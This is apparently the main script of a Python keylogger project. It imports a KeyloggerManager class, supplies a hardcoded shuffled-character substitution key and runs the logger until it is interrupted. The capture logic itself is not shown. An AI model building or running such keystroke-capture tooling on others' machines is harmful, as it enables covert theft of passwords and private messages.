import time
from keylogger_manager import KeyloggerManager

if __name__ == "__main__":
    # key = CreateKey().key
    key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*', 'L', 'f', '7', 'g', '$', '!', 'V', '_', 'Z', 'O', 'X', '1', 'k', '?', '(', '\\', 'N', ':', 'e', 'p', '>', '`', 'h', '^', 'I', '#', 'a', 'Y', '"', 'l', 'Q', '[', ' ', 'C', 'J', '+', 'T', 's', '/', 'i', 't', 'S', ']', 'w', 'u', ')', 'A', 'F', '{', ',', '8', 'R', '2', '.', 'o', 'b', 'r', "'", '%', 'c', '&', 'D', ';', '<', '9', '4', 'd', 'z', '|', 'y', '}', 'j', 'G', '6', 'M', '~', 'v', 'B', 'W', 'q', 'K']
    keylogger = KeyloggerManager(key)
    keylogger.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping...")
        keylogger.stop()
